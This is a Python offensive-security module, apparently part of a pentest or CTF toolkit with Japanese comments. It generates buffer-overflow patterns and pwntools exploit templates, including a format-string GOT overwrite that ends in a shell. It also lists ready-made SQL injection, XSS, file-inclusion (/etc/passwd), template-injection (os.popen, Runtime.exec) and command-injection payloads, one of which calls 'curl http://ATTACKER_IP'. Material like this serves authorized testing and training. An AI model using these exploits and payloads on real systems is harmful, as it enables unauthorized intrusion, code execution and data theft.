"""
Fuzzing Module - 脆弱性発見のための自動ファジング

バッファオーバーフロー、フォーマット文字列、Webパラメータのファジング
研究目的専用 - 許可のないシステムへの使用は違法です
"""

import asyncio
import sys
import string
import struct
from typing import Optional, List


class Fuzzer:
    """ファジングモジュール - 脆弱性自動検出"""

    def __init__(self):
        self.default_timeout = 60

    async def _run_command(self, cmd: list, timeout: int = None) -> str:
        """コマンドを非同期で実行"""
        if timeout is None:
            timeout = self.default_timeout

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            return stdout.decode('utf-8', errors='ignore')

        except Exception as e:
            return f"[ERROR] {str(e)}"

    # ==========================================================================
    # パターン生成 (De Bruijn Sequence)
    # ==========================================================================

    def generate_pattern(self, length: int) -> str:
        """サイクリックパターンを生成（BOFオフセット特定用）

        より効率的なDe Bruijn風パターン生成

        Args:
            length: 生成するパターン長
        """
        pattern = ""
        chars_upper = string.ascii_uppercase
        chars_lower = string.ascii_lowercase
        chars_digit = string.digits

        i = 0
        for upper in chars_upper:
            for lower in chars_lower:
                for digit in chars_digit:
                    if i >= length:
                        return pattern
                    pattern += upper
                    i += 1
                    if i >= length:
                        return pattern
                    pattern += lower
                    i += 1
                    if i >= length:
                        return pattern
                    pattern += digit
                    i += 1

        return pattern

    def find_pattern_offset(self, pattern: str, value: str) -> str:
        """パターン内のオフセットを検索

        Args:
            pattern: 生成したパターン
            value: 検索値（4/8バイトhex or 文字列）
        """
        results = []
        results.append(f"=== Pattern Offset Search ===")
        results.append(f"Value: {value}\n")

        # Hex値の変換
        if value.startswith("0x") or value.startswith("0X"):
            try:
                hex_val = int(value, 16)

                # 32-bit リトルエンディアン
                search_32_le = struct.pack("<I", hex_val & 0xFFFFFFFF)
                search_str_32_le = search_32_le.decode('latin-1')

                # 64-bit リトルエンディアン
                search_64_le = struct.pack("<Q", hex_val)
                search_str_64_le = search_64_le.decode('latin-1')

                offset_32 = pattern.find(search_str_32_le)
                offset_64 = pattern.find(search_str_64_le)

                if offset_32 != -1:
                    results.append(f"✅ 32-bit Little Endian: オフセット = {offset_32}")
                if offset_64 != -1:
                    results.append(f"✅ 64-bit Little Endian: オフセット = {offset_64}")

                if offset_32 == -1 and offset_64 == -1:
                    results.append("❌ パターン内に見つかりませんでした")

            except Exception as e:
                results.append(f"[ERROR] Hex変換エラー: {e}")
        else:
            # 文字列検索
            offset = pattern.find(value)
            if offset != -1:
                results.append(f"✅ オフセット = {offset}")
            else:
                # 逆順も試す
                offset_rev = pattern.find(value[::-1])
                if offset_rev != -1:
                    results.append(f"✅ オフセット (reversed) = {offset_rev}")
                else:
                    results.append("❌ パターン内に見つかりませんでした")

        return '\n'.join(results)

    # ==========================================================================
    # バッファオーバーフロー検出
    # ==========================================================================

    def generate_bof_payloads(self, start_len: int = 100, end_len: int = 3000,
                              step: int = 100) -> str:
        """BOFテスト用ペイロードリストを生成

        Args:
            start_len: 開始長
            end_len: 終了長
            step: 増分
        """
        results = []
        results.append(f"=== BOF Test Payloads ===")
        results.append(f"Range: {start_len} - {end_len} (step {step})\n")

        payloads = []
        for length in range(start_len, end_len + 1, step):
            payload = "A" * length
            payloads.append(f"Length {length}: python3 -c \"print('A' * {length})\"")

        results.append('\n'.join(payloads))

        results.append(f"\n【pwntools版】")
        results.append(f"""from pwn import *
for length in range({start_len}, {end_len+1}, {step}):
    p = process('./binary')
    p.sendline(b'A' * length)
    try:
        p.wait(timeout=1)
    except:
        print(f"Crashed at {{length}}")
        break
""")

        return '\n'.join(results)

    def get_bof_exploit_template(self) -> str:
        """BOFエクスプロイトテンプレート"""
        return """=== Buffer Overflow Exploit Template ===

#!/usr/bin/env python3
from pwn import *

# 設定
context.binary = elf = ELF('./binary')
context.log_level = 'debug'

# Step 1: クラッシュの確認
# python3 -c "print('A' * 1000)" | ./binary

# Step 2: パターンでオフセット特定
# pattern = cyclic(1000)
# offset = cyclic_find(0x61616161)

# Step 3: EIP/RIP制御の確認
offset = 0  # 特定したオフセット
p = process(elf.path)

payload = b"A" * offset
payload += p64(0xdeadbeef)  # 制御確認用

p.sendline(payload)

# Step 4: リターンアドレスをエクスプロイトに
# - ret2win: elf.symbols['win']
# - ret2libc: elf.plt['system']
# - ROP: gadgets

p.interactive()
"""

    # ==========================================================================
    # フォーマット文字列検出
    # ==========================================================================

    def generate_format_string_payloads(self) -> str:
        """フォーマット文字列脆弱性テスト用ペイロード"""
        return """=== Format String Test Payloads ===

【基本検出】
%x                          # スタック値をhexで出力
%p                          # ポインタ値を出力
%s                          # スタック上のアドレスの文字列を出力
%n                          # これまでの出力バイト数を書き込み (危険)

【オフセット特定】
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
# 0x41414141が何番目に出るか確認

# 直接指定
AAAA%7$x                    # 7番目の引数をhex
AAAA%7$s                    # 7番目の引数を文字列として

【アドレスリーク】
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
# libc, main, stackアドレスを探す

【GOT overwrite (書き込み)】
# 4バイト書き込み
python3 -c "print(b'ADDR' + b'%Xc%N\\$n')"

# pwntools使用
from pwn import *
payload = fmtstr_payload(offset, {target_addr: value})

【One-shot payloads】
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
%016lx.%016lx.%016lx.%016lx (64-bit)
"""

    def get_format_string_exploit(self) -> str:
        """フォーマット文字列エクスプロイトテンプレート"""
        return """=== Format String Exploit Template ===

#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 適宜変更

p = process(elf.path)

# Step 1: オフセット特定
# AAAA%p.%p.%p.%p.%p.%p... で0x41414141の位置を確認
offset = 0  # 特定した値

# Step 2: リーク
# puts@GOT -> libcベースアドレス
payload = f"%{offset}$s".encode()
payload += p64(elf.got['puts'])

p.sendline(payload)
leaked = u64(p.recv(6).ljust(8, b'\\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Step 3: GOT overwrite
# puts@GOT -> system
writes = {elf.got['puts']: libc.symbols['system']}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)

# Step 4: Trigger
p.sendline(b'/bin/sh')
p.interactive()
"""

    # ==========================================================================
    # Webファジング
    # ==========================================================================

    def generate_web_fuzz_payloads(self, vuln_type: str = "all") -> str:
        """Web脆弱性ファジング用ペイロード

        Args:
            vuln_type: 脆弱性タイプ (sqli, xss, lfi, ssti, cmd, all)
        """
        payloads = {}

        payloads['sqli'] = """【SQL Injection】
'
''
`
``
"
""
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 --
" OR "1"="1
" OR "1"="1" --
' OR 'x'='x
') OR ('1'='1
1' ORDER BY 1--
1' ORDER BY 10--
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
' AND SLEEP(5)--
' AND BENCHMARK(5000000,SHA1('test'))--
'; WAITFOR DELAY '0:0:5'--
"""

        payloads['xss'] = """【XSS (Cross-Site Scripting)】
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src="x" onerror="alert(1)">
<svg/onload=alert(1)>
javascript:alert(1)
<a href="javascript:alert(1)">click</a>
<div onmouseover="alert(1)">hover</div>
{{constructor.constructor('alert(1)')()}}
"""

        payloads['lfi'] = """【LFI (Local File Inclusion)】
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252f..%252f..%252fetc/passwd
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
/etc/passwd
file:///etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain,<?php phpinfo(); ?>
expect://id
"""

        payloads['ssti'] = """【SSTI (Server-Side Template Injection)】
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
{{self.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()}}
${T(java.lang.Runtime).getRuntime().exec('whoami')}
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
"""

        payloads['cmd'] = """【Command Injection】
; id
| id
|| id
& id
&& id
` id `
$(id)
; ls -la
| ls -la
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
`whoami`
$(whoami)
; ping -c 3 ATTACKER_IP
| curl http://ATTACKER_IP
"""

        results = ["=== Web Fuzzing Payloads ===\n"]

        if vuln_type == "all":
            for key, value in payloads.items():
                results.append(value)
        elif vuln_type in payloads:
            results.append(payloads[vuln_type])
        else:
            results.append(f"Unknown type: {vuln_type}")
            results.append(f"Available: {', '.join(payloads.keys())}, all")

        return '\n'.join(results)

    async def generate_wfuzz_command(self, url: str, param: str,
                                      wordlist: str = "sqli") -> str:
        """wfuzzコマンド生成

        Args:
            url: ターゲットURL (FUZZをプレースホルダーとして使用)
            param: ファジングするパラメータ名
            wordlist: ワードリストタイプ (sqli, xss, lfi, common)
        """
        wordlist_paths = {
            'sqli': '/usr/share/wfuzz/wordlist/Injections/SQL.txt',
            'xss': '/usr/share/wfuzz/wordlist/Injections/XSS.txt',
            'lfi': '/usr/share/wfuzz/wordlist/Injections/LFI.txt',
            'common': '/usr/share/wordlists/dirb/common.txt',
        }

        wl_path = wordlist_paths.get(wordlist, wordlist)

        # URLにFUZZが含まれていない場合は追加
        if "FUZZ" not in url:
            if "?" in url:
                url = f"{url}&{param}=FUZZ"
            else:
                url = f"{url}?{param}=FUZZ"

        return f"""=== WFuzz Command ===

wfuzz -c -z file,{wl_path} --hc 404 "{url}"

【オプション】
-c              # カラー出力
--hc 404        # 404を除外
--hh NUM        # 特定文字数のレスポンスを除外
--hw NUM        # 特定ワード数を除外
--hl NUM        # 特定行数を除外
-t NUM          # スレッド数

【ffuf版】
ffuf -w {wl_path} -u "{url}" -fc 404.
"""

    # ==========================================================================
    # ステータス
    # ==========================================================================

    async def get_status(self) -> str:
        """ステータスを取得"""
        return """=== Fuzzer Module Status ===

✅ Pattern Generation: generate_pattern, find_pattern_offset
✅ BOF Testing: generate_bof_payloads, bof_exploit_template
✅ Format String: generate_format_string_payloads, fsb_exploit_template
✅ Web Fuzzing: SQLi, XSS, LFI, SSTI, Command Injection
✅ WFuzz/FFuf: generate_wfuzz_command
"""

    def list_all_techniques(self) -> str:
        """利用可能なテクニック一覧"""
        return """=== Fuzzer Techniques ===

【Binary Fuzzing】
- Pattern generation (cyclic)
- Pattern offset finding
- BOF payload generation
- Format string testing

【Web Fuzzing】
- SQL Injection payloads
- XSS payloads
- LFI/RFI payloads
- SSTI payloads
- Command Injection payloads
- Automated wfuzz/ffuf commands
"""
